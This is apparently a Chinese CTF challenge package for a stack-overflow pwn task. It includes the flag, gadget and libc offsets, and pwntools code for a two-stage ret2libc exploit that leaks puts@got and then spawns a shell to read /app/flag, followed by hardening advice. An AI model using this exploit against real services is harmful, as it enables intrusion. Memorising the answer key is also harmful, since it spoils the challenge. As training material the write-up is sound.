# pwn-ret2libc

## 一、题目与考点

| 项 | 值 |
|---|---|
| 难度 | 难 |
| 考点 | GOT 泄露 libc 基址；`pop rdi; ret` 传参；两段式 ROP；ret2libc |
| 容器端口 | 宿主机 9109 → 容器 1337 |
| Flag | `flag{ret2libc_leak_then_system}` |
| libc 版本 | Ubuntu GLIBC **2.35-0ubuntu3.15**（容器内 `ldd --version` 与 `files/libc.so.6` 一致） |

## 题面（直接复制到平台「简介」）

一个收下一段数据就什么都不回显的服务，flag 在容器的 `/app/flag` 里。用 `nc <地址> 9109` 连上去，只能看到 `input:` 和结尾的 `done`。目标：程序里既没有 `system` 也没有打印 flag 的代码，自己开出 shell 去把文件读出来。

**提示**：`file` 说它是动态链接的；`objdump -R` 里那些表项在运行时会指向真实库地址，先想办法把其中一个读出来。

## 二、题目描述

```
nc <host> 9109
input:
```

```c
void vuln(void) {
    char buf[64];
    read(0, buf, 0x200);
}
```

程序里没有任何打印 flag 的函数，也没有 `system` 调用，只有一次栈溢出。
必须泄露 libc 地址，再回到 libc 里调用 `system("/bin/sh")`。

## 三、解题步骤

### 3.1 准备

```bash
checksec --file=files/pwn
# Partial RELRO | No canary | NX enabled | No PIE (0x400000)

ls files/
# pwn  libc.so.6
```

二进制里显式留了一个 `pop rdi; ret`：

```bash
objdump -d files/pwn | sed -n '/<pop_rdi_ret>:/,+2p'
# 401176: 5f        pop    rdi
# 401177: c3        ret
```

各地址（`nm` / `objdump -R` 可得）：

| 名称 | 地址 |
|---|---|
| `vuln` | `0x401178` |
| `pop_rdi_ret` | `0x401176` |
| `puts@plt` | `0x401064` |
| `puts@got` | `0x404018` |

### 3.2 取 libc 偏移

`files/libc.so.6` 就是容器里的那份，直接用：

```bash
readelf -sW files/libc.so.6 | awk '$8=="puts@@GLIBC_2.2.5"{print "puts", $2}'
readelf -sW files/libc.so.6 | awk '$8=="system@@GLIBC_2.2.5"{print "system", $2}'
strings -a -t x files/libc.so.6 | grep '/bin/sh'
```

或者用 pwntools：

```python
libc = ELF('files/libc.so.6')
hex(libc.symbols['puts'])              # 0x80e10
hex(libc.symbols['system'])            # 0x50d70
hex(next(libc.search(b'/bin/sh')))     # 0x1d8678
```

容器内确认版本：

```bash
docker run --rm --entrypoint /lib/x86_64-linux-gnu/libc.so.6 pwn-ret2libc:latest | head -1
# GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.15) stable release version 2.35.
```

### 3.3 第一段：泄露 puts 的真实地址

`buf` 在 `rbp-0x40`，返回地址在 `rbp+8`，偏移 `0x40 + 8 = 72`。

```python
payload = b'A' * 72
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
payload += p64(vuln)          # 打印完再回到 vuln，第二轮还能读
p.send(payload)
leak = u64(p.recvline().strip(b'\n').ljust(8, b'\x00'))
```

`puts` 打印 6 字节就遇到 `\x00` 停下，所以用 `ljust(8, b'\x00')` 补齐再 `u64`。

### 3.4 第二段：ret2libc

```python
libc_base = leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh  = libc_base + next(libc.search(b'/bin/sh'))

payload  = b'A' * 72
payload += p64(ret)           # 多一个 ret 做 16 字节对齐
payload += p64(pop_rdi) + p64(binsh) + p64(system)
p.send(payload)
time.sleep(0.2)
p.sendline(b'cat /app/flag')
```

### 3.5 运行

```bash
python3 exp/exp.py
```

输出：

```
[+] puts = 0x7a7f2c96be10  libc_base = 0x7a7f2c8eb000  system = 0x7a7f2c93bd70
flag{...}
```

## 四、原理

**为什么要泄露**：ASLR 随机化了 libc 的加载基址，`system`/`/bin/sh` 的真实地址每次运行都不同。
但 libc 内部的相对偏移是固定的，只要拿到任意一个已知符号的真实地址，减去它在 libc 里的偏移就是基址。

**怎么泄露**：`puts(puts@got)`。`puts@got` 里存的是 libc 中 `puts` 的绝对地址，
`puts` 会把它当字符串指针，一直打印到 `\x00`。返回地址链写成
`pop rdi; ret` → `puts@got` → `puts@plt` → `vuln`，一次溢出同时完成"传参 + 调用 + 回到漏洞点"。

**为什么能回到 vuln**：`read` 已经读完，但 `vuln` 可以被反复调用，第二轮继续读入新的 payload。

**对齐**：`system` 内部有 `movaps`，要求进入时 `rsp % 16 == 8`。
用 `ret` 串联时栈指针比 `call` 少压一层，链子前面补一个单独的 `ret` gadget 即可。

## 五、防御建议

- 开启 PIE：代码段基址随机化后，`pop rdi` / `puts@plt` / `puts@got` 都需要另外泄露。
- 开启 Full RELRO：`puts@got` 只读，无法被读后改写，也难以做 GOT 劫持。
- 开启 canary：溢出前先破坏 canary。
- 不要把 libc 版本暴露给选手；补丁到最新 libc，偏移表会随版本变化。

## 六、附件清单

| 文件 | 说明 |
|---|---|
| `files/pwn` | 与容器内一致的二进制 |
| `files/libc.so.6` | 容器内 `/lib/x86_64-linux-gnu/libc.so.6` 原件（2.35-0ubuntu3.15） |
| `src/pwn.c` | 源码 |
| `exp/exp.py` | pwntools 脚本 |
| `Dockerfile` / `entrypoint.sh` / `docker-compose.yml` | 容器 |
| `checker/main.rx` | 判题脚本 |

`checksec`（`files/pwn`）：

```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
Stripped: No
```

libc 偏移（`files/libc.so.6`）：

| 符号 | 偏移 |
|---|---|
| `puts` | `0x80e10` |
| `system` | `0x50d70` |
| `/bin/sh` | `0x1d8678` |

编译环境：`gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0`，容器 `ubuntu:22.04`。

---

## 平台镜像配置（添加镜像时照这张表填）

| 字段 | 填什么 | 说明 |
|---|---|---|
| 容器名称 | `pwn-ret2libc` | 与题目目录名、tar 文件名保持一致 |
| 镜像标签 | `<registry>/<bucket>/pwn-ret2libc` | 仓库名取自 tar 文件名（去扩展名），上传后 UI 自动带出 |
| 镜像版本 | 上传后生成的 Unix 时间戳 | 下拉选最新那条，不要手填 |
| 镜像拉取策略 | `Always` | 与平台默认一致 |
| 服务描述 | Pwn/交互题（nc 连上去打） | 只是备注，不影响运行 |
| 传输协议 | `tcp` | 全库只有 TCP 服务 |
| 应用协议 | `raw` | 裸 TCP / SSH / socat 选 raw |
| **服务端口** | **`1337`** | 容器内实际监听端口，必须与 Dockerfile 的 `EXPOSE` 一致 |
| CPU 限制 | `0.1, 0.3` | 最小, 最大（核） |
| 内存限制（MB） | `64, 128` | 最小, 最大 |
| 存储限制（MB） | `64, 1024` | 最小, 最大 |
| restricted | **勾选** | 平台会 drop `NET_BIND_SERVICE`，所以容器监听的是 `1337` 而不是 80 |
| 出网 | **关闭** | 本题不需要外网 |

> 端口必须填 **1337**。这是 socat / 裸 TCP 服务的监听端口，选手用 `nc <地址> <映射端口>` 连。
